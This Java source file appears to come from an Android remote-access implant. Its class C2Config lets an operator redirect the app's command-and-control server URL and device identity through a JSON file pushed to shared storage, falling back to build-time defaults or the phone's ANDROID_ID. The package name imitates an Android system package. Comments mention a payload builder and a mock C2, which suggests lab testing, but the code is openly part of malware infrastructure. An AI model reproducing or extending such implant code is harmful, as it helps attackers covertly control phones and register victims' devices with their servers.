package com.android.background.services;

import android.content.Context;
import android.provider.Settings;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Per-run runtime configuration for the C2 connection.
 *
 * Lets an operator change the server URL and the device identity WITHOUT
 * rebuilding the APK. Push a small JSON file to one of the locations below and
 * the app picks it up on its next process start:
 *
 *   {"url": "http://192.168.0.108:42474", "device_id": "my-test-phone"}
 *
 *   adb push tools/c2_config.template.json /sdcard/Download/c2_config.json
 *
 * - "url"       overrides the build-time SOCKET_URL. "http://" is added if the
 *               scheme is missing.
 * - "device_id" replaces the Android ID in the registration query string, so a
 *               mock C2 can tell one run apart from another.
 *
 * Missing file, missing keys, or a malformed file fall back to the build-time
 * defaults (BuildConfig.SOCKET_URL / Settings.Secure.ANDROID_ID), so a plain
 * build keeps working exactly as before.
 */
public final class C2Config {

    private static final String TAG = "C2Config";
    private static final String CONFIG_FILE = "c2_config.json";

    /** Candidate locations, checked in order. The app-specific external dir is
     *  adb-pushable on every Android version with no storage permission needed. */
    private static final String[] PUBLIC_PATHS = {
            "/storage/emulated/0/Download/" + CONFIG_FILE,
            "/sdcard/Download/" + CONFIG_FILE,
            "/sdcard/" + CONFIG_FILE,
    };

    private C2Config() {
    }

    /** Effective server URL for this run: config override or BuildConfig. */
    public static String getUrl(Context ctx) {
        String raw = load(ctx);
        String url = extract(raw, "url", null);
        if (url != null && !url.trim().isEmpty()) {
            url = url.trim();
            if (!url.startsWith("http://") && !url.startsWith("https://")) {
                url = "http://" + url;
            }
            Log.d(TAG, "using runtime config url: " + url);
            return url;
        }
        Log.d(TAG, "using build-time SOCKET_URL: " + BuildConfig.SOCKET_URL);
        return BuildConfig.SOCKET_URL;
    }

    /** Effective device identity for this run: config override, baked-in
     *  default (payload builder), or ANDROID_ID. */
    public static String getDeviceId(Context ctx) {
        String raw = load(ctx);
        String id = extract(raw, "device_id", null);
        if (id != null && !id.trim().isEmpty()) {
            Log.d(TAG, "using runtime config device_id: " + id.trim());
            return id.trim();
        }
        if (BuildConfig.DEFAULT_DEVICE_ID != null && !BuildConfig.DEFAULT_DEVICE_ID.isEmpty()) {
            Log.d(TAG, "using baked-in device_id: " + BuildConfig.DEFAULT_DEVICE_ID);
            return BuildConfig.DEFAULT_DEVICE_ID;
        }
        if (ctx != null) {
            String androidId = Settings.Secure.getString(ctx.getContentResolver(),
                    Settings.Secure.ANDROID_ID);
            if (androidId != null) {
                return androidId;
            }
        }
        return "unknown";
    }

    // -- file loading -----------------------------------------------------

    private static String load(Context ctx) {
        if (ctx != null) {
            File appDir = ctx.getExternalFilesDir(null);
            if (appDir != null) {
                File f = new File(appDir, CONFIG_FILE);
                if (f.isFile()) {
                    return read(f);
                }
            }
        }
        for (String path : PUBLIC_PATHS) {
            File f = new File(path);
            if (f.isFile()) {
                return read(f);
            }
        }
        return null;
    }

    private static String read(File f) {
        try {
            InputStream in = new FileInputStream(f);
            try {
                int len = (int) Math.min(f.length(), 1 << 16);
                byte[] buf = new byte[len];
                int n = in.read(buf);
                return n > 0 ? new String(buf, 0, n, "UTF-8") : null;
            } finally {
                in.close();
            }
        } catch (Exception e) {
            Log.w(TAG, "failed to read " + f.getAbsolutePath(), e);
            return null;
        }
    }

    /**
     * Extract the value of a top-level string key from a JSON-ish document.
     *
     * Deliberately regex-based (no org.json dependency) so it is a pure
     * function that runs identically on the device and in JVM unit tests.
     * Returns {@code fallback} for null / malformed input or a missing key.
     */
    public static String extract(String json, String key, String fallback) {
        if (json == null) {
            return fallback;
        }
        try {
            Matcher m = Pattern.compile(
                    "\"" + Pattern.quote(key) + "\"\\s*:\\s*\"([^\"]*)\"")
                    .matcher(json);
            if (m.find()) {
                String value = m.group(1);
                return value.isEmpty() ? fallback : value;
            }
        } catch (Exception ignored) {
            // malformed input: fall through to the fallback
        }
        return fallback;
    }
}
